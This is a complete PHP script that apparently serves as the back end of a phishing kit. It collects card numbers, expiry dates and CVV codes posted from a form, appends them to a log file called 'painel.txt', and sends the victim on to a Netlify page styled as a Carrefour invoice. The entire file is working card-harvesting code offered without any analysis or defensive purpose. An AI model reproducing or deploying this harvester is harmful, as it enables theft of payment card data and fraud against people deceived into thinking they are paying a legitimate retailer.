<?php
$cartao = $_POST['numero_cartao'];
$validade = $_POST['ddvalidade'];
$cvv = $_POST['ndocvv'];
$tudo = "".$cartao.";".$validade.";".$cvv."<br>";
$fopen = fopen("painel.txt", "a");
fwrite($fopen, $tudo);
fclose($fopen);


header("Location: https://faturacarrefour.netlify.app/fim.html");
?>